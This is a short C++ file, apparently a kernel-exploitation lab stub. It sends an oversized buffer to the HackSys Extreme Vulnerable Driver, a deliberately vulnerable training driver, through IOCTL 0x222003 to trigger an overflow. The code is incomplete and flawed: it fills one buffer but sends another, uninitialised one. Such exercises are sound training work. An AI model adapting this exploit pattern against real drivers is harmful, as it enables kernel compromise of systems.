// kpwn.cpp : Defines the entry point for the console application.


#include "stdafx.h"
#include <Windows.h>
#include <tchar.h>
#include <memory>


#define BUFFER_LENGTH 2080

void main()
{
	HANDLE driver = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	
	char buffer[BUFFER_LENGTH + 4];
	char* buffer2;
	buffer2 = (char*)malloc(2084);
	memset(buffer, 0x41, sizeof(int));
	DWORD junk = 0;
	bool exploit = DeviceIoControl(driver, 0x222003, buffer2, 2084, NULL, 0, &junk, (LPOVERLAPPED)NULL);
	if (!exploit) {
		wprintf_s(L"Cant send the exploit ");
	}
}
